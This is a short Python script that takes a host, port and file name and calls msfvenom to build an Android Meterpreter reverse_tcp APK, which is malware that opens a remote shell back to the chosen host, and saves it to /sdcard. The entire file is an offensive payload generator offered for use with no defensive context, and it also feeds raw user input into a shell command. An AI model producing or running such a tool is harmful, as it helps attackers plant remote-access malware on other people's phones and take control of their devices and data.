import subprocess
import os
host = input("HOST: ")
port = input("PORT: ")
apk_name = input("APK NAME: ")

payload = """
msfvenom -p android/meterpreter/reverse_tcp lhost=%s lport=%s -o/sdcard/%s"""%(host,port,apk_name)
null = open(os.devnull,'w')
subprocess.call(payload,shell=True,stdout=null)
print("\n")
print("[+] Successfully create go >> /sdcard")

